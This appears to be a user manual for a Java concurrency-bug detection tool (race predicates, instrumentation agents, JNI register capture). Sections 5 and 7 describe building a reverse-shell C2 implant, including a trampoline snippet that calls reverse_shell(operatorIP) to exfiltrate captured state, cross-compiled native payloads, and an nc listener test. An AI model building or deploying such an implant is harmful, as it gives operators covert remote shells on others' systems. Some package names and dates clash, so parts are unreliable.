# Software User Manual (SUM)

# By Oblivion Edge Vulnerabilty Research LLC, Copyright (c) November 16 2026


## LLP Predicate Detection System — CNO Package Development Platform

**Document Version:** 1.0  
**Date:** 2026-10-03  
**Author:** Oblivion Edge Vulnerability Research LLC 
**Classification:** For Authorized Security Research and Educational Use Only

---

# NOTE: SPIDEYS TOOLKIT IS ONLY THE CNO PACKAGE DEVELOPMENT (SECTION 5)

## Table of Contents

1. [Getting Started](#1-getting-started)
   1. [System Requirements](#11-system-requirements)
   2. [Installation](#12-installation)
   3. [Project Structure Overview](#13-project-structure-overview)
   4. [Quick Verification](#14-quick-verification)
2. [Predicate Detection Usage](#2-predicate-detection-usage)
   1. [Running the CLI](#21-running-the-cli)
   2. [Targeting Java Classes](#22-targeting-java-classes)
   3. [Targeting JAR Files](#23-targeting-jar-files)
   4. [Selecting Predicates](#24-selecting-predicates)
   5. [Interpreting Results](#25-interpreting-results)
3. [Instrumentation and Agents](#3-instrumentation-and-agents)
   1. [Startup-Time Instrumentation](#31-startup-time-instrumentation)
   2. [Runtime Agent Attachment](#32-runtime-agent-attachment)
   3. [Configuring Target Packages](#33-configuring-target-packages)
   4. [Bytecode Transformation Details](#34-bytecode-transformation-details)
4. [Trampoline Instrumentation](#4-trampoline-instrumentation)
   1. [Understanding the Trampoline Pattern](#41-understanding-the-trampoline-pattern)
   2. [Using InstrumentBinary](#42-using-instrumentbinary)
   3. [Register State Capture](#43-register-state-capture)
   4. [Native Library Compilation](#44-native-library-compilation)
5. [CNO Package Development](#5-cno-package-development)
   1. [Development Environment Setup](#51-development-environment-setup)
   2. [Writing Native C Payloads](#52-writing-native-c-payloads)
   3. [JNI Header Generation](#53-jni-header-generation)
   4. [Cross-Compilation for Target Architectures](#54-cross-compilation-for-target-architectures)
   5. [JAR Assembly and Deployment](#55-jar-assembly-and-deployment)
6. [SCons Build System](#6-scons-build-system)
   1. [SCons Installation and Setup](#61-scons-installation-and-setup)
   2. [Build Commands Reference](#62-build-commands-reference)
   3. [Architecture Selection](#63-architecture-selection)
   4. [Debug and Release Modes](#64-debug-and-release-modes)
   5. [Packaging and Deployment](#65-packaging-and-deployment)
7. [C2 Channel Operations](#7-c2-channel-operations)
   1. [Reference Implementation Overview](#71-reference-implementation-overview)
   2. [Building the Shared Object](#72-building-the-shared-object)
   3. [Integration with Trampoline Framework](#73-integration-with-trampoline-framework)
   4. [Testing in Isolated Environments](#74-testing-in-isolated-environments)
8. [Example Programs](#8-example-programs)
   1. [RacyCounter — Data Race Detection](#81-racycounter--data-race-detection)
   2. [SafeCounter — Validation](#82-safecounter--validation)
   3. [ProducerConsumer — Queue Races](#83-producerconsumer--queue-races)
   4. [BufferOverflowDemo — Array Bounds](#84-bufferoverflowdemo--array-bounds)
9. [Troubleshooting](#9-troubleshooting)
   1. [Common Build Issues](#91-common-build-issues)
   2. [Native Library Loading Failures](#92-native-library-loading-failures)
   3. [Agent Attachment Problems](#93-agent-attachment-problems)
   4. [Lattice Explosion Mitigation](#94-lattice-explosion-mitigation)
10. [Reference](#10-reference)
    1. [CLI Flags Reference](#101-cli-flags-reference)
    2. [Event Types](#102-event-types)
    3. [Predicate Descriptions](#103-predicate-descriptions)
    4. [File Output Formats](#104-file-output-formats)

---

## 1. Getting Started

### 1.1 System Requirements

The LLP Predicate Detection System requires a Java Development Kit (JDK) version 17 or later, Apache Maven 3.6 or later for building the Java components, and a C compiler (GCC 7+ recommended) for compiling native shared objects. The system is developed and tested primarily on Linux (x86-64), though macOS support is available with minor build adjustments for shared object file extensions (`.dylib` instead of `.so`).

For cross-compilation to non-native architectures, you will need the appropriate cross-compiler toolchains installed. On Ubuntu/Debian systems, these can be installed via `apt`: `sudo apt install gcc-aarch64-linux-gnu` for ARM64 and `sudo apt install gcc-mips-linux-gnu` for MIPS. The SCons build system (version 3.0 or later) is required for the shared object compilation pipeline; install it with `pip install scons` or `sudo apt install scons`.

Optional dependencies include PlantUML (for regenerating architecture diagrams from the `.puml` source files) and a LaTeX distribution (TeX Live recommended) for compiling the documentation PDFs. These are only needed if you intend to modify and rebuild the documentation.

### 1.2 Installation

Begin by cloning the repository and building the Java components with Maven. The following commands compile all Java source files, run the unit tests, and produce the application JAR:

```bash
git clone <repository-url> predicatedetectionproject
cd predicatedetectionproject/my-app
mvn compile
mvn test
```

If the build succeeds, you will see `BUILD SUCCESS` in the Maven output. The compiled classes are placed in `my-app/target/classes/`. To verify that the detection engine is functional, run the included RacyCounter example, which should detect data races in an unsynchronized counter program.

For native library support, you need to compile the C source files in the `instrumentation/inlineassembly/` directory. Navigate to that directory and compile the 64-bit assembly library:

```bash
cd my-app/src/main/java/com/utece/student/llpdetection/instrumentation/inlineassembly/
gcc -shared -fPIC \
    -I$JAVA_HOME/include \
    -I$JAVA_HOME/include/linux \
    -o libassembly.so \
    RegistersNative_64.c TrampolineExample.c RIPExample.c
```

Install the compiled shared object into your local Maven repository or place it on the Java library path. Without the native library, the system operates in Java-only mode — bytecode instrumentation and predicate detection function normally, but register-level capture is disabled.

### 1.3 Project Structure Overview

The project is organized into a standard Maven directory layout with additional directories for native code, documentation, and build artifacts:

```
predicatedetectionproject/
├── docs/                          # Documentation and diagrams
│   ├── SDD.md                     # Software Design Document (this doc's companion)
│   ├── SUM.md                     # This Software User Manual
│   ├── diagrams/                  # PlantUML source and compiled PNG diagrams
│   ├── deep_dive.md               # Technical deep dive
│   └── LLPD_Complete_Technical_Reference.md
├── my-app/                        # Maven project root
│   ├── pom.xml                    # Maven build configuration
│   └── src/main/java/com/utece/student/llpdetection/
│       ├── LLPMain.java           # CLI entry point
│       ├── agents/                # Java instrumentation agents
│       ├── transformers/          # Bytecode transformers
│       ├── instrumentation/       # Native code bridge & trampolines
│       ├── predicate/             # Detection engine & built-in predicates
│       ├── visualization/         # Console and HTML output
│       └── examples/              # Demo programs
├── SConstruct                     # SCons build configuration for native code
└── README.md                      # Project overview
```

Understanding this layout is essential for navigating the codebase. The Java source code lives entirely under `my-app/src/main/java/`, and the native C source files are co-located with their Java counterparts in the `instrumentation/inlineassembly/` directory. This co-location simplifies the development workflow because the C files and their corresponding Java class declarations are always in the same directory.

### 1.4 Quick Verification

To verify that the complete system is working, run the following command from the `my-app/` directory:

```bash
mvn -q exec:java \
  -Dexec.mainClass=com.utece.student.llpdetection.LLPMain \
  -Dexec.args="com.utece.student.llpdetection.examples.RacyCounter --cli"
```

You should see an ASCII timeline showing the detected data races in the RacyCounter program. The output will include a summary header with thread and event counts, a thread timeline with race markers, and detailed race cards describing each detected race. If you see `[InstrumentBinary] Native assembly library not available`, the system is running in Java-only mode — this is expected if you have not compiled the native library.

---

## 2. Predicate Detection Usage

### 2.1 Running the CLI

The LLP detection engine is invoked through the `LLPMain` class, which accepts a target specification and optional flags. The target can be a fully qualified Java class name, a path to a `.java` source file, or a path to a JAR file with a `Main-Class` manifest attribute. The CLI parses the target, loads or compiles the program, runs it with event collection enabled, then performs lattice-based predicate detection and renders the results.

The basic invocation pattern is:

```bash
mvn -q exec:java \
  -Dexec.mainClass=com.utece.student.llpdetection.LLPMain \
  -Dexec.args="<target> [options]"
```

Replace `<target>` with the fully qualified class name (e.g., `com.utece.student.llpdetection.examples.RacyCounter`) or a file path (e.g., `path/to/Target.java` or `path/to/target.jar`). The target class must have a `public static void main(String[])` method or a no-argument `run()` method.

### 2.2 Targeting Java Classes

When targeting a fully qualified class name, the class must be on the classpath. The Maven exec plugin automatically includes the project's compiled classes and dependencies. For external classes, add them to the classpath through Maven's dependency mechanism or the `-Dexec.classpathScope` flag.

The detection engine loads the target class using reflection, looks for a `main(String[])` method, and invokes it with an empty argument array. If the class implements `Runnable`, the engine calls `run()` instead. During execution, the LLP transformer instruments all field accesses in the target class and its dependencies (excluding system packages) to record events. After the target program completes, the engine collects all event logs and performs lattice analysis.

For programs that require specific command-line arguments, pass them after the target name separated by `--`: `"com.example.Target -- arg1 arg2"`. The detection engine forwards these arguments to the target's `main` method.

### 2.3 Targeting JAR Files

JAR file targets are loaded by inspecting the manifest for the `Main-Class` attribute. The detection engine adds the JAR to the classpath, loads the main class, and instruments it along with all referenced classes. This mode is useful for analyzing pre-compiled applications where source code is not available.

```bash
mvn -q exec:java \
  -Dexec.mainClass=com.utece.student.llpdetection.LLPMain \
  -Dexec.args="path/to/application.jar --cli --predicates race,buffer"
```

The JAR must be a standard executable JAR with a `Main-Class` manifest attribute. The detection engine does not support multi-module JARs or JARs that require a custom classloader configuration. For complex applications, consider targeting specific classes within the JAR rather than the JAR's main entry point.

### 2.4 Selecting Predicates

By default, the detection engine runs all five built-in predicates. You can select specific predicates using the `--predicates` flag with a comma-separated list:

```bash
--predicates race              # Data race detection only
--predicates race,atomicity    # Data races and atomicity violations
--predicates buffer,heap,stack # Memory safety predicates only
--predicates all               # All predicates (default)
```

Running fewer predicates reduces the per-cut evaluation time, which can be significant when the lattice contains many cuts. For initial analysis, start with `--predicates race` (the fastest and most common) and expand to other predicates only if the initial results suggest additional vulnerability classes.

### 2.5 Interpreting Results

The detection engine outputs results in one of two formats, selected by the `--cli` or `--gui` flag. The `--cli` format renders an ASCII timeline in the terminal with ANSI color coding. The `--gui` format generates an interactive HTML report saved as `llp-report.html` in the current directory.

The output structure follows a consistent pattern across both formats. The summary section shows the total number of threads, events, consistent cuts explored, races detected, and predicate violations found. The thread timeline displays each thread's events in chronological order, with connecting lines between events that participate in races. The contention heat map shows which memory locations have the highest frequency of concurrent access, helping to identify hot spots that are most likely to harbor concurrency bugs.

Each detected race or violation includes a detailed card showing the two conflicting events (thread IDs, event types, target class and field, vector clocks) and an explanation of why they constitute a violation. For data races, the explanation notes that the events are concurrent (neither's vector clock dominates the other's) and that they access the same memory location with at least one write. Understanding vector clock comparisons is key to interpreting these results: if event A has clock `[2, 0]` and event B has clock `[0, 1]`, they are concurrent because neither clock dominates the other.

---

## 3. Instrumentation and Agents

### 3.1 Startup-Time Instrumentation

The preferred instrumentation method is startup-time agent loading via the `-javaagent` JVM flag. This ensures that all classes are instrumented before they are first loaded, providing complete coverage. To use this method, package the LLP classes into a JAR with the appropriate manifest and specify it on the command line:

```bash
java -javaagent:llp-agent.jar=com.target.package \
     -cp your-application.jar \
     com.target.MainClass
```

The agent argument (after the `=`) specifies which packages to instrument. Only classes in these packages will have event recording code injected; all other classes are loaded normally. If no argument is provided, the agent instruments all non-system classes, which may cause excessive overhead for large applications.

The `premain(String, Instrumentation)` method in `JavaAgent` is called by the JVM before the application's `main` method. It parses the target packages from the agent arguments, creates an `LLPTransformer` instance configured with those packages, and registers the transformer with the `Instrumentation` API. From that point forward, every class loaded by the JVM passes through the transformer, which uses Javassist to inject `EventCollector` calls around field access operations.

### 3.2 Runtime Agent Attachment

For applications that are already running, the `Launcher` class provides runtime agent attachment via the `VirtualMachine.attach()` API. This mechanism is part of the Java Attach API (in the `jdk.attach` module) and allows loading an agent into a running JVM process by PID.

```bash
# Find the target JVM's PID
jps -l

# Attach the agent
java -cp llp-agent.jar \
     com.utece.student.llpdetection.agents.Launcher <target-packages>
```

The `Launcher` reads the current JVM's PID (using `ProcessHandle.current().pid()`), attaches to it, and loads the agent JAR. The agent's `agentmain` method is invoked, which follows the same pattern as `premain`: parse target packages, create the transformer, and register it. The key difference is that classes already loaded by the target JVM must be retransformed using `Instrumentation.retransformClasses()` to inject the event recording code. The agent requests retransformation of all loaded classes that match the target package filter.

Runtime attachment requires that the target JVM was started with the `-XX:+EnableDynamicAgentLoading` flag (on Java 17+, this is needed to allow dynamic agent loading) or that the JVM's security policy permits agent attachment. Some container environments restrict the attach API for security reasons.

### 3.3 Configuring Target Packages

The target package configuration determines which classes are instrumented. Specifying too many packages increases overhead and may generate an overwhelming number of events; specifying too few may miss the code that contains the vulnerability. The recommended approach is to start with the application's top-level package and narrow the scope based on initial results.

Multiple packages can be specified by separating them with commas in the agent argument: `-javaagent:llp.jar=com.target.core,com.target.util`. The transformer performs a prefix match: any class whose fully qualified name starts with one of the target package prefixes will be instrumented. System packages (`java.*`, `javax.*`, `sun.*`, `jdk.*`, `com.sun.*`) are always excluded to prevent instrumenting the JVM's own classes.

The transformer also excludes the LLP system's own classes (`com.utece.student.llpdetection.predicate.event.*`) to avoid infinite recursion — if the `EventCollector`'s own field accesses were instrumented, each recording call would generate another recording call, resulting in a stack overflow.

### 3.4 Bytecode Transformation Details

The `LLPTransformer` uses Javassist's `ExprEditor` mechanism to intercept field access operations at the bytecode level. When a class is loaded through the transformer, Javassist parses its bytecode into an editable representation, and the `FieldAccessEditor` inner class's `edit(FieldAccess fa)` method is called for each field access instruction.

For field reads, the editor replaces the original bytecode with code that first executes the read (`$_ = $proceed()`) and then calls `EventCollector.onFieldRead()` with the class name, field name, and read value. For field writes, the editor calls `EventCollector.onFieldWrite()` with the class name, field name, old value, and new value before executing the write (`$proceed($1)`). This ordering ensures that the event is recorded at the correct point in the program's execution relative to other events.

Array accesses are not automatically instrumented by the transformer because Javassist's `ExprEditor` does not intercept array load/store instructions. Instead, array accesses must be instrumented manually by calling `EventCollector.onArrayRead()` and `EventCollector.onArrayWrite()` directly in the target code. The example programs in the `examples` package demonstrate this manual instrumentation pattern.

---

## 4. Trampoline Instrumentation

### 4.1 Understanding the Trampoline Pattern

The trampoline pattern converts recursive function interception into an iterative process. In the context of the LLP system, a trampoline is a Java object that represents a single interception step. Each step can perform native operations (register reads, context captures) and then return a new trampoline representing the next step. The `execute()` method drives the iteration: it repeatedly calls `run()` to get the next trampoline and `get()` to check for a terminal value, looping until `get()` returns a non-null result.

This pattern is particularly useful for function interception because it avoids the stack depth limitations of recursive approaches. In a traditional hook-based system, each intercepted function call adds a frame to the call stack, and deep call chains can cause stack overflow. The trampoline flattens this recursion: each interception step runs in a constant-depth stack frame, regardless of how many functions are intercepted. The `toString()` method returns `"Some iteration in LibC"`, hinting at the original use case of intercepting libc function calls.

To use the trampoline for custom interception, subclass `Trampoline<T>` and override `run()` with your interception logic. The `InstrumentBinary` constructor demonstrates this pattern, creating an anonymous `Trampoline<Object>` subclass that reads all registers in its `run()` method. Your custom trampoline can perform any operation — logging, state inspection, conditional breakpoints — before returning either `this` (to continue iterating) or a new trampoline with a non-null `get()` value (to terminate).

### 4.2 Using InstrumentBinary

The `InstrumentBinary` class provides a ready-to-use trampoline for register state capture. Instantiate it and call `invoke()` to trigger a single register capture iteration:

```java
InstrumentBinary ib = new InstrumentBinary();
ib.invoke();  // Prints RIP, RAX, RBX, RCX, RDX in hex

// Or access individual registers:
long rip = ib.getRip();
long returnAddr = ib.getLrAtSpecified(1);
```

The constructor checks whether the native assembly library is available. If it is, the constructor creates a trampoline that captures all registers on each `run()` invocation. If the native library is not available (the common case when the shared object has not been compiled), the constructor logs a message and sets the `instrumentThis` field to null, causing `invoke()` to be a no-op. This graceful degradation means you can write code that uses `InstrumentBinary` unconditionally; it will capture registers when the native library is present and silently skip when it is not.

The `isNativeAvailable()` static method allows you to check whether native instrumentation is active before attempting register captures. This is useful in conditional logic where you want to take different actions depending on whether native support is available.

### 4.3 Register State Capture

Register state capture provides a snapshot of the CPU's register file at a specific point in the program's execution. The captured registers and their typical uses in vulnerability research are:

| Register | Name | Common Use |
|----------|------|-----------|
| **RIP** | Instruction Pointer | Current execution address; overwrite = control flow hijack |
| **RAX** | Accumulator | Return values; function call results |
| **RBX** | Base | General purpose; often callee-saved |
| **RCX** | Counter | Loop counters; 4th function argument (System V ABI) |
| **RDX** | Data | 3rd function argument; I/O operations |

The register values captured through JNI are the values at the point of the native function call, not at the point of the original Java method call. The JNI transition adds several stack frames between the Java code and the C code, which means the return address captured by `__builtin_return_address(0)` points into the JNI transition code, not into the Java code. Use `__builtin_return_address(1)` or higher depths to reach the Java-side call site. The exact number of JNI transition frames depends on the JVM implementation and version.

### 4.4 Native Library Compilation

To compile the native library on your development platform:

```bash
# Set JAVA_HOME if not already set
export JAVA_HOME=$(dirname $(dirname $(readlink -f $(which java))))

# Navigate to the inline assembly directory
cd my-app/src/main/java/com/utece/student/llpdetection/instrumentation/inlineassembly/

# Compile all C source files into a single shared object
gcc -shared -fPIC -O2 \
    -I$JAVA_HOME/include \
    -I$JAVA_HOME/include/linux \
    -o libassembly.so \
    RegistersNative_64.c TrampolineExample.c RIPExample.c

# Verify the shared object exports the expected symbols
nm -D libassembly.so | grep Java_
```

The `nm` command should show JNIEXPORT symbols matching the Java native method declarations. If you see `undefined symbol` errors when loading the library, the C function names do not match the expected JNI naming convention. Regenerate the JNI headers with `javac -h . NativeAssembly_64.java` and verify that the C function signatures match.

For macOS, replace `-shared` with `-dynamiclib` and change the output extension to `.dylib`. The JNI include path changes to `$JAVA_HOME/include/darwin`.

---

## 5. CNO Package Development

### 5.1 Development Environment Setup

Setting up a CNO package development environment requires the standard Java development tools plus native compilation infrastructure. Begin by ensuring that your system has the following components installed and configured:

1. **JDK 17+** — Required for the Java agent framework and compilation
2. **GCC 7+** — Required for compiling C source files with inline assembly
3. **SCons 3.0+** — Required for the shared object build pipeline
4. **Maven 3.6+** — Required for the Java build and dependency management

For cross-compilation work, install the target architecture's toolchain. On Ubuntu/Debian:

```bash
# ARM64 cross-compiler
sudo apt install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu

# MIPS cross-compiler
sudo apt install gcc-mips-linux-gnu g++-mips-linux-gnu

# Verify installation
aarch64-linux-gnu-gcc --version
mips-linux-gnu-gcc --version
```

Set up an isolated test environment (VM or container) for validating deployed packages. The test environment should match the target architecture and operating system. For x86-64 development and testing on the same machine, a Docker container provides sufficient isolation.

### 5.2 Writing Native C Payloads

Native C payloads implement the low-level functionality that the Java framework cannot provide directly: register access, system calls, memory manipulation, and network operations. Each payload consists of a C source file that includes the JNI header for its corresponding Java class and implements the declared native methods.

The basic structure of a native payload is:

```c
#include <jni.h>
#include "com_utece_student_llpdetection_instrumentation_YourClass.h"

JNIEXPORT jlong JNICALL
Java_com_utece_student_llpdetection_instrumentation_YourClass_yourMethod(
    JNIEnv *env, jobject this) {
    // Your native implementation here
    return result;
}
```

The function name must follow the JNI naming convention exactly: `Java_` prefix, followed by the fully qualified class name with dots replaced by underscores, followed by the method name. Underscores in the Java name are encoded as `_1`, and overloaded methods require a signature suffix. The JNI header generator produces the correct function signatures automatically.

When writing payloads that use inline assembly, always use the `volatile` qualifier to prevent the compiler from reordering or eliminating the assembly instructions. Inline assembly that reads registers is particularly sensitive to optimization because the compiler may not understand the data dependencies involved.

### 5.3 JNI Header Generation

Generate JNI headers from your Java class declarations using the `javac -h` flag (Java 9+):

```bash
cd my-app/src/main/java
javac -h com/utece/student/llpdetection/instrumentation/ \
      com/utece/student/llpdetection/instrumentation/YourClass.java
```

This produces a header file named after the fully qualified class name (with dots replaced by underscores and a `.h` extension) in the specified output directory. The header declares the JNI function signatures that your C code must implement. If the Java class has no `native` method declarations, no header is generated.

For the reverse shell component, the generated header is `com_bdg_double07_reversecshell_instrumentation_reverseshell_NativeReverseShell.h`, which declares `JNIEXPORT void JNICALL Java_...NativeReverseShell_reverse_1shell(JNIEnv*, jobject, jstring)`. The `_1` encoding represents the underscore in `reverse_shell`. The `jstring` parameter corresponds to the Java `String ip` argument and must be converted to a C string using `(*env)->GetStringUTFChars(env, jstr, NULL)`.

### 5.4 Cross-Compilation for Target Architectures

Cross-compilation produces shared objects that run on architectures different from the build machine. The SCons build system abstracts the toolchain selection, but understanding the underlying process is important for troubleshooting.

The key difference between native and cross-compilation is the compiler and its default target. When you run `gcc` on an x86-64 machine, it produces x86-64 code by default. When you run `aarch64-linux-gnu-gcc`, it produces ARM64 code. The compiler flags and include paths are otherwise identical, with the exception of architecture-specific flags like `-march=armv8-a` for ARM or `-mips32r2` for MIPS.

To verify that a cross-compiled shared object targets the correct architecture, use the `file` command:

```bash
file build/arm/libtrampoline.so
# Expected: ELF 64-bit LSB shared object, ARM aarch64, ...

file build/x86_64/libtrampoline.so
# Expected: ELF 64-bit LSB shared object, x86-64, ...
```

Cross-compiled shared objects cannot be loaded on the build machine (unless you are using QEMU user-mode emulation). They must be transferred to a system running the target architecture for testing.

### 5.5 JAR Assembly and Deployment

The final step in CNO package development is assembling the Java classes and native shared objects into a deployable JAR:

```bash
# Create the JAR structure
mkdir -p staging/META-INF staging/lib/x86_64 staging/lib/aarch64

# Copy manifest
cat > staging/META-INF/MANIFEST.MF <<EOF
Manifest-Version: 1.0
Premain-Class: com.utece.student.llpdetection.agents.JavaAgent
Can-Retransform-Classes: true
EOF

# Copy compiled classes
cp -r my-app/target/classes/com staging/

# Copy native libraries
cp build/x86_64/libtrampoline.so staging/lib/x86_64/
cp build/aarch64/libtrampoline.so staging/lib/aarch64/

# Create the JAR
cd staging && jar cmf META-INF/MANIFEST.MF ../llp-agent.jar . && cd ..
```

Deploy the JAR using either startup-time or runtime attachment as described in Section 3.

---

## 6. SCons Build System

### 6.1 SCons Installation and Setup

Install SCons via pip or your system's package manager:

```bash
pip install scons
# or
sudo apt install scons
```

Verify the installation with `scons --version`. The SConstruct file in the project root configures all build targets. SCons uses Python as its configuration language, so the build file is a valid Python script that calls SCons API functions to define build targets, environments, and dependencies.

### 6.2 Build Commands Reference

The following commands are available from the project root directory:

```bash
# Build shared objects for the default (host) architecture
scons

# Build for a specific architecture
scons arch=x86_64
scons arch=arm
scons arch=mips

# Build in debug mode (with symbols, no optimization)
scons mode=debug

# Build in release mode (optimized, stripped)
scons mode=release

# Package all built artifacts into a JAR
scons package

# Clean build artifacts
scons -c

# Dry run (show what would be built without building)
scons -n
```

Each command can combine multiple options: `scons arch=arm mode=release` produces an optimized ARM shared object. The `package` target depends on at least one architecture being built; it will fail if no shared objects exist in the `build/` directory.

### 6.3 Architecture Selection

The `arch` variable selects the target ISA and configures the appropriate compiler and flags:

| Architecture | Compiler | Key Flags | Output |
|-------------|----------|-----------|--------|
| `x86_64` | `gcc` | `-m64 -fPIC -shared` | `build/x86_64/libtrampoline.so` |
| `arm` | `aarch64-linux-gnu-gcc` | `-fPIC -shared -march=armv8-a` | `build/arm/libtrampoline.so` |
| `mips` | `mips-linux-gnu-gcc` | `-fPIC -shared -mips32r2` | `build/mips/libtrampoline.so` |

If the selected architecture's cross-compiler is not installed, SCons will report an error with instructions for installing the required package. The build system detects available toolchains at configuration time using `WhereIs()` to search the system PATH.

### 6.4 Debug and Release Modes

Debug mode (`mode=debug`) adds the `-g` flag for debug symbols and `-O0` for no optimization. This mode is recommended during development because it preserves the correspondence between C source lines and compiled instructions, making GDB debugging possible. The resulting shared objects are larger but contain full symbol information.

Release mode (`mode=release`) adds `-O2` for optimization and `-s` for symbol stripping. Optimized shared objects are smaller and faster, but debugging is difficult because the compiler may reorder instructions, inline functions, and eliminate variables. Use release mode for deployment builds.

The default mode is `debug` if not specified. This is a deliberate choice for a research tool: during development, debuggability is more important than performance.

### 6.5 Packaging and Deployment

The `package` target assembles all built shared objects into a JAR file. It scans the `build/` directory for all architecture subdirectories, copies the shared objects into the JAR's `lib/<arch>/` structure, includes the compiled Java classes from `my-app/target/classes/`, and generates a manifest with the `Premain-Class` attribute.

```bash
# Build for multiple architectures, then package
scons arch=x86_64
scons arch=arm
scons package
```

The resulting `llp-agent.jar` is placed in the project root directory. It contains shared objects for every architecture that was built before the `package` command, plus all Java classes needed for the agent framework.

---

## 7. C2 Channel Operations

### 7.1 Reference Implementation Overview

The C2 (Command and Control) channel reference implementation in `ReverseShell.c` demonstrates the pattern of establishing an outbound network connection from a target system back to an operator's listening post. This is a fundamental technique in CNO operations, where inbound connections to the target are typically blocked by firewalls but outbound connections from the target are permitted.

The implementation uses standard POSIX socket APIs: `socket()` creates a TCP endpoint, `connect()` establishes the outbound connection to a specified IP address and port, `dup2()` redirects standard I/O to the socket, and `execve()` replaces the process with an interactive shell. The simplicity of this implementation is intentional — it demonstrates the minimum viable C2 channel that can be extended with encryption, authentication, and protocol obfuscation for more sophisticated deployments.

This component is intended exclusively for authorized security testing, CTF challenges, and educational purposes. It must only be deployed against systems for which the operator has explicit written authorization.

### 7.2 Building the Shared Object

Compile the C2 channel shared object using the SCons build system or direct GCC invocation:

```bash
# Using SCons (recommended)
scons arch=x86_64

# Direct compilation (for development/debugging)
gcc -shared -fPIC \
    -I$JAVA_HOME/include \
    -I$JAVA_HOME/include/linux \
    -o libimplant.so \
    ReverseShell.c
```

The shared object must be compiled with `-fPIC` (position-independent code) because it will be loaded into the JVM's address space via `System.load()`. Without this flag, the linker may produce a shared object that cannot be relocated, causing a load-time error.

### 7.3 Integration with Trampoline Framework

The C2 channel integrates with the trampoline framework by embedding network operations within a trampoline's `run()` iteration. This allows the researcher to intercept a target function, capture its state, and exfiltrate the captured data through the C2 channel — all within a single deterministic interception step.

The integration pattern extends `Trampoline<T>` with a custom `run()` method that calls both the register capture functions and the C2 channel functions:

```java
Trampoline<Object> combined = new Trampoline<>() {
    @Override
    public Trampoline<Object> run() {
        long rip = NativeAssembly_64.print_eip();
        long rax = NativeAssembly_64.print_rax();
        // Capture complete, exfiltrate via C2
        NativeReverseShellWrapper.instance.reverse_shell(operatorIP);
        return this;
    }
};
```

This combination provides both instrumentation (register capture) and communication (C2 channel) in a single trampoline iteration, ensuring that the captured data is exfiltrated immediately after capture without additional framework overhead.

### 7.4 Testing in Isolated Environments

Always test C2 channel deployments in isolated environments before any external use. The recommended testing setup uses two terminals on the same machine or within a private network:

```bash
# Terminal 1: Start the listener (operator side)
nc -lvp 1420

# Terminal 2: Run the C2 channel (target side)
java -cp llp-agent.jar \
     com.utece.student.llpdetection.TestImplant 127.0.0.1
```

If the connection is successful, Terminal 1 will show a shell prompt from Terminal 2. Type commands in Terminal 1 to verify that the shell is functional. Use `exit` or Ctrl+C to close the connection.

For cross-architecture testing, use QEMU user-mode emulation to run ARM or MIPS binaries on an x86-64 host:

```bash
# Install QEMU user-mode emulation
sudo apt install qemu-user-static

# Test ARM shared object
qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./test_arm_binary
```

---

## 8. Example Programs

### 8.1 RacyCounter — Data Race Detection

The `RacyCounter` example creates four threads that each increment a shared counter 10 times. The counter and a shared array are accessed without synchronization, creating data races. Run the example with:

```bash
mvn -q exec:java \
  -Dexec.mainClass=com.utece.student.llpdetection.LLPMain \
  -Dexec.args="com.utece.student.llpdetection.examples.RacyCounter --cli"
```

Expected output includes multiple detected data races on the `counter` field and `buckets` array. The final counter value will typically be less than 40 (4 threads x 10 iterations) due to lost updates, which the race detector identifies and reports.

### 8.2 SafeCounter — Validation

The `SafeCounter` example uses the same thread structure as `RacyCounter` but wraps all accesses in a `synchronized(lock)` block. This ensures mutual exclusion, eliminating data races. Running this example should produce zero race detections, validating that the detection engine does not produce false positives on correctly synchronized code.

```bash
mvn -q exec:java \
  -Dexec.mainClass=com.utece.student.llpdetection.LLPMain \
  -Dexec.args="com.utece.student.llpdetection.examples.SafeCounter --cli"
```

The output should show "0 races detected" and a clean thread timeline with no race markers. If races are reported for `SafeCounter`, it indicates a bug in the detection engine's lock tracking.

### 8.3 ProducerConsumer — Queue Races

The `ProducerConsumer` example demonstrates races in an unsynchronized queue implementation. A producer thread adds items while a consumer thread removes them concurrently, creating races on the queue's internal state (size counter, head/tail pointers).

### 8.4 BufferOverflowDemo — Array Bounds

The `BufferOverflowDemo` example creates concurrent threads that access an array with indices that can go out of bounds when modified concurrently. The `BufferOverflowPredicate` detects consistent cuts where an array write event is concurrent with an index modification, indicating a potential out-of-bounds access.

---

## 9. Troubleshooting

### 9.1 Common Build Issues

**Maven compilation fails with "source/target 17":** Ensure that `JAVA_HOME` points to a JDK 17+ installation. Verify with `java -version` and `javac -version`. If multiple JDKs are installed, set `JAVA_HOME` explicitly: `export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64`.

**SCons reports "gcc not found":** The system PATH does not include the compiler. On most Linux distributions, install GCC with `sudo apt install gcc` or `sudo yum install gcc`. For cross-compilers, install the architecture-specific package as described in Section 5.1.

**Maven dependencies fail to download:** Check your internet connection and Maven settings. If behind a proxy, configure it in `~/.m2/settings.xml`. For air-gapped environments, pre-download dependencies on a connected machine and transfer the local repository.

### 9.2 Native Library Loading Failures

**"UnsatisfiedLinkError: no assembly in java.library.path":** The native shared object is not on the Java library path. Either set `java.library.path` to include the directory containing `libassembly.so` (`-Djava.library.path=/path/to/dir`) or load the library by absolute path using `System.load()`.

**"UnsatisfiedLinkError: undefined symbol":** The C function names do not match the expected JNI naming convention. Regenerate the JNI headers and verify that your C function signatures match exactly. Common causes include missing `_1` encoding for underscores and incorrect package path encoding.

**"[InstrumentBinary] Native assembly library not available":** This informational message indicates that the native library could not be loaded. The system will operate in Java-only mode. This is normal if you have not compiled the native library. Compile it following the instructions in Section 4.4.

### 9.3 Agent Attachment Problems

**"AttachNotSupportedException":** The target JVM does not support dynamic agent loading. On Java 17+, add `-XX:+EnableDynamicAgentLoading` to the target JVM's startup flags. On older versions, ensure the JVM is started with the Attach API enabled (it is by default on most implementations).

**"IOException: No such process":** The specified PID does not correspond to a running JVM process. Verify the PID with `jps -l` and ensure the target process has not exited.

### 9.4 Lattice Explosion Mitigation

If the detection engine takes an extremely long time or consumes excessive memory, the lattice may be too large. Use the `--max-cuts` flag to limit the number of consistent cuts explored:

```bash
--max-cuts 10000    # Explore at most 10,000 cuts
--max-cuts 1000     # For very large programs, start small
```

The tradeoff is completeness: with a lower `maxCuts` value, the engine may miss violations that exist only in unexplored regions of the lattice. Start with a lower value for initial analysis, then increase it if no violations are found but you suspect they exist.

---

## 10. Reference

### 10.1 CLI Flags Reference

| Flag | Description | Default |
|------|-------------|---------|
| `--cli` | Output results as ASCII timeline to terminal | (one required) |
| `--gui` | Output results as interactive HTML report | (one required) |
| `--predicates <list>` | Comma-separated predicate selection | `all` |
